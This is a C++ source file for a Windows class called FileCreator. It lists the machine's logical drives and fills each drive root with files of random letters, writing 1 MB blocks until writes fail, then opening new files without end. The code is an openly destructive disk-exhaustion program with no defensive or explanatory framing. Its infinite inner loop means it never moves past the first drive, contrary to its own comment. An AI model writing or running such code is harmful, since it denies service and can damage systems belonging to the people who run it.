#include "FileCreator.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <process.h>
#include <shlobj.h>

#define BUFFER_SIZE 1024 * 1024 // 1 MB buffer size

void FileCreator::createTextFileWithRandomData(const std::string& filename) {
    std::ofstream file(filename, std::ios::binary);

    if (file.is_open()) {
        std::vector<char> buffer(BUFFER_SIZE);

        for (size_t i = 0; i < BUFFER_SIZE; i++) {
            buffer[i] = 'A' + rand() % 26;
        }

        while (true) {
            file.write(buffer.data(), buffer.size());
            if (!file) {
                break; // Exit loop if write operation fails
            }
        }

        file.close();
        std::cout << "File created: " << filename << std::endl;
    }
    else {
        std::cerr << "Failed to create file: " << filename << std::endl;
    }
}

void FileCreator::createFilesInDirectory(const std::string& directoryPath) {
    std::string filename;
    int fileCount = 1;
    while (true) {
        filename = directoryPath + "\\full" + std::to_string(fileCount) + ".txt";
        createTextFileWithRandomData(filename);
        fileCount++;
    }
}

unsigned __stdcall FileCreator::createFiles(void* arg) {
    FileCreator* fileCreator = reinterpret_cast<FileCreator*>(arg);
    DWORD drives = GetLogicalDrives();
    DWORD mask = 1;

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & mask) {
            std::string drivePath = std::string(1, drive) + ":\\";
            fileCreator->createFilesInDirectory(drivePath);
        }
        mask <<= 1;
    }

    // Free the allocated object
    delete fileCreator;

    // Terminate the program when all disks are full
    exit(0);

    return 0;
}

void FileCreator::startFileCreation() {
    HANDLE thread = NULL;
    FileCreator* fileCreator = new FileCreator();

    if (fileCreator != NULL) {
        thread = (HANDLE)_beginthreadex(NULL, 0, createFiles, fileCreator, 0, NULL);
        if (thread == NULL) {
            std::cerr << "Failed to create thread." << std::endl;
            delete fileCreator;
        }
    }
    else {
        std::cerr << "Failed to allocate memory for thread data." << std::endl;
    }

    if (thread != NULL) {
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }
}
